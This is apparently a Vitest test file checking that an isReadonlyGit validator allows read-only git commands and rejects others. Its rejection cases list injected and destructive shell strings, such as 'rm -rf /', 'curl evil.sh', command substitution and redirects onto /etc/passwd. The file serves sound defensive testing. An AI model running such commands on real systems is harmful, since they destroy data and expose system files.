import { describe, it, expect } from 'vitest'
import { isReadonlyGit } from './claude'

describe('isReadonlyGit', () => {
  it('読み取り専用の git は許可する', () => {
    for (const cmd of [
      'git diff',
      'git diff HEAD~1',
      'git log --oneline -10',
      'git show abc123',
      'git status',
      'git blame src/index.ts',
      'git stash list',
      'git stash show',
    ]) {
      expect(isReadonlyGit(cmd), cmd).toBe(true)
    }
  })

  it('書き込み・破壊的な git は拒否する', () => {
    for (const cmd of [
      'git commit -m x',
      'git add .',
      'git push',
      'git checkout main',
      'git reset --hard',
      'git rm file',
      'git clean -fd',
      'git stash drop',
      'git stash',
    ]) {
      expect(isReadonlyGit(cmd), cmd).toBe(false)
    }
  })

  it('シェルの連結・リダイレクト・置換を含むものは拒否する', () => {
    for (const cmd of [
      'git log; rm -rf /',
      'git diff && curl evil.sh',
      'git status | tee out',
      'git show $(whoami)',
      'git log `id`',
      'git diff > /etc/passwd',
      'git log\nrm -rf .',
    ]) {
      expect(isReadonlyGit(cmd), cmd).toBe(false)
    }
  })

  it('git 以外のコマンドは拒否する', () => {
    for (const cmd of ['rm -rf /', 'ls', 'cat /etc/passwd', 'gitfoo diff', 'echo git diff']) {
      expect(isReadonlyGit(cmd), cmd).toBe(false)
    }
  })
})
